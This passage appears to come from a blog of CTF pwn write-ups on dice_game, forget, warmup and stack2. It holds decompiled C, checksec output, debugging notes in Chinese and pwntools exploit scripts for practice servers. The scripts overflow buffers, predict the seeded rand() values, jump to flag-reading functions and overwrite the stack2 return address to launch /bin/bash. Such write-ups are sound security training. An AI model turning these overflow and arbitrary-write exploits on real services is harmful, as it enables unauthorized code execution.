<span class="hljs-number">1</span>;<br>  flag = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Game %d/50\n&quot;</span>, count);<br>    flag = <span class="hljs-built_in">dice_game</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( flag != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( count == <span class="hljs-number">50</span> )<br>    &#123;<br>      <span class="hljs-built_in">Congrats</span>((__int64)buf);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    ++count;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 <span class="hljs-title">sub_A20</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">signed</span> __int64 result; <span class="hljs-comment">// rax</span><br>  __int16 v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br>  __int16 v2; <span class="hljs-comment">// [rsp+Eh] [rbp-2h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me the point(1~6): &quot;</span>);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">6</span> )<br>  &#123;<br>    v2 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">6</span> || v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">6</span> )<br>      _assert_fail(<span class="hljs-string">&quot;(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)&quot;</span>, <span class="hljs-string">&quot;dice_game.c&quot;</span>, <span class="hljs-number">0x18</span>u, <span class="hljs-string">&quot;dice_game&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( v1 == v2 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You win.&quot;</span>);<br>      result = <span class="hljs-number">1LL</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You lost.&quot;</span>);<br>      result = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid value!&quot;</span>);<br>    result = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congrats %s\n&quot;</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby"><span class="hljs-number">0000000000000050</span> buf             db <span class="hljs-number">55</span> dup(<span class="hljs-string">?)</span></span><br><span class="ruby"></span>-<span class="ruby">0000000000000019 flag            db ?</span><br><span class="ruby"></span>-<span class="ruby">0000000000000018 read_length     dq ?</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000010</span> seed            dd <span class="hljs-number">2</span> dup(<span class="hljs-string">?)</span></span><br><span class="ruby"></span>-<span class="ruby">0000000000000008                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000007</span>                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000006</span>                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000005</span>                 db ? ; undefined</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-number">0000000000000004</span> count           dd ?</span><br><span class="ruby"></span>+0000000000000000  s              db 8 dup(?)<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">42284</span>)<br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>payload=<span class="hljs-number">0x40</span>*<span class="hljs-string">&#x27;a&#x27;</span>+p64(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;let me know your name: &quot;</span>,payload)<br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">50</span>):<br>      <span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;Give me the point(1~6): &quot;</span>,str(libc.rand()%<span class="hljs-number">6</span>+<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="forget"><a href="#forget" class="headerlink" title="forget"></a>forget</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">59133</span>)<br>cat_flag=<span class="hljs-number">0x080486CC</span><br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<br>payload=<span class="hljs-number">32</span>*<span class="hljs-string">&#x27;A&#x27;</span>+p32(cat_flag)<br><span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>(arch = &#x27;amd<span class="hljs-number">64</span>&#x27;, os = &#x27;linux&#x27;)<br><span class="hljs-attribute">sh</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;,<span class="hljs-number">31012</span>)<br><span class="hljs-attribute">cat_flag</span> = <span class="hljs-number">0</span>x<span class="hljs-number">40060</span>d<br><span class="hljs-attribute">sh</span>.sendline(&#x27;A&#x27; * <span class="hljs-number">72</span> + p<span class="hljs-number">64</span>(cat_flag))<br><span class="hljs-attribute">sh</span>.interactive()<br><br><br></code></pre></td></tr></table></figure><h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>开了NX，canary</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+18h] [ebp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+1Ch] [ebp-8Ch]</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [esp+20h] [ebp-88h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [esp+24h] [ebp-84h]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [esp+28h] [ebp-80h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+2Ch] [ebp-7Ch]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> k; <span class="hljs-comment">// [esp+30h] [ebp-78h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> l; <span class="hljs-comment">// [esp+34h] [ebp-74h]</span><br>  <span class="hljs-keyword">char</span> v13[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+38h] [ebp-70h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+9Ch] [ebp-Ch]</span><br><br>  v14 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***********************************************************&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*                      An easy calc                       *&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***********************************************************&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me your numbers&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5 &amp;&amp; (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)i &lt;= <span class="hljs-number">99</span>; ++i )<br>  &#123;<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>    v13[i] = v7;<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = v5; ; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;average is %.2lf\n&quot;</span>, (<span class="hljs-keyword">double</span>)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">double</span>)v9 / (<span class="hljs-keyword">double</span>)j)) )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);<br>          __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6);<br>          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">2</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me your number&quot;</span>);<br>          __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>          <span class="hljs-keyword">if</span> ( j &lt;= <span class="hljs-number">0x63</span> )<br>          &#123;<br>            v3 = j++;<br>            v13[v3] = v7;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">2</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;id\t\tnumber&quot;</span>);<br>        <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; j; ++k )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;which number to change:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;new number:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>      v13[v5] = v7;<span class="hljs-comment">//这里V5,V7没做任何检查，所以可以任意写了</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; j; ++l )<br>      v9 += v13[l];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用IDA动态调试</p><p>直接在main的ret下断点，得到esp:FFF17E6C,输入了9 8 7 6 5 4 3 2 1 1</p><p>栈排布：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DE8 db    9        low</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DE9 db    8</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEA db    7</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEB db    6</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEC db    5</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DED db    4</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEE db    3</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DEF db    2</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DF0 db    1</span><br>[<span class="hljs-symbol">stack</span>]:<span class="hljs-link">FFF17DF1 db    1         high</span><br></code></pre></td></tr></table></figure><p>0xFFF17DE8-0xFFF17E6C=0x84=132</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">g_local</span>=False<br><span class="hljs-attribute">context</span>.log_level=&#x27;debug&#x27;<br><br><span class="hljs-attribute">if</span> g_local:<br><span class="hljs-attribute">sh</span> = process(&#x27;./stack<span class="hljs-number">2</span>&#x27;)#env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.<span class="hljs-number">6</span>&#x27;&#125;<br><span class="hljs-attribute">gdb</span>.attach(sh)<br><span class="hljs-attribute">else</span>:<br><span class="hljs-attribute">sh</span> = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>, <span class="hljs-number">31906</span>)<br><br><span class="hljs-attribute">def</span> write_byte(<span class="hljs-literal">off</span>, val):<br><span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;3\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;which number to change:\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.send(str(<span class="hljs-literal">off</span>) + <span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;new number:\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.send(str(val) + <span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;5. exit\n&quot;</span>)<br><br><span class="hljs-attribute">def</span> write_dword(<span class="hljs-literal">off</span>, val):<br><span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span>, val &amp; <span class="hljs-number">0</span>xff)<br><span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span> + <span class="hljs-number">1</span>, (val &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0</span>xff)<br><span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span> + <span class="hljs-number">2</span>, (val &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0</span>xff)<br><span class="hljs-attribute">write_byte</span>(<span class="hljs-literal">off</span> + <span class="hljs-number">3</span>, (val &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0</span>xff)<br><br><span class="hljs-attribute">def</span> exit():<br><span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;5\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.interactive()<br><br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;How many numbers you have:\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;1\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;Give me your numbers\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.send(<span class="hljs-string">&quot;1\n&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;5. exit\n&quot;</span>)<br><br><span class="hljs-attribute">write_dword</span>(<span class="hljs-number">0</span>x<span class="hljs-number">84</span>, <span class="hljs-number">0</span>x<span class="hljs-number">8048450</span>)<br><span class="hljs-attribute">write_dword</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">8048980</span> + <span class="hljs-number">7</span>)<br><span class="hljs-attribute">exit</span>()<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># stack2_1.py<br><br>from pwn import *<br><br># a = process(<span class="hljs-emphasis">&#x27;./stack2&#x27;</span>)<br><br>a = remote(&quot;111.198.29.45&quot;, &quot;42691&quot;)<br><br>#system_addr = 0x8048450<br><br># off_addr = 0x9c<br><br># a.send(<span class="hljs-emphasis">&#x27;1\n1\n3\n156\n80\n3\n157\n132\n3\n158\n4\n3\n159\n8\n5\n&#x27;</span>)<br><br># a.interactive()<br><br>a.sendline(<span class="hljs-emphasis">&#x27;1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8&#x27;</span>)<br>&#x27;&#x27;&#x27;<br>0x08048450<br><span class="hljs-title">.plt:08048450 ; int system(const char *command)</span><br>#80/132/4/8<br>&#x27;&#x27;&#x27;<br>a.sendline(<span class="hljs-emphasis">&#x27;3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8&#x27;</span>)<br>&#x27;&#x27;&#x27;<br>0x08048987<br>08048980  2F 62 69 6E 2F 62 61 73  68 00 00 00 2A 2A 2A 2A  /bin/bash...<span class="hljs-strong">***</span>*<br>#135/137/4/8<br>&#x27;&#x27;&#x27;<br>a.sendline(<span class="hljs-emphasis">&#x27;5&#x27;</span>)<br><br>a.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 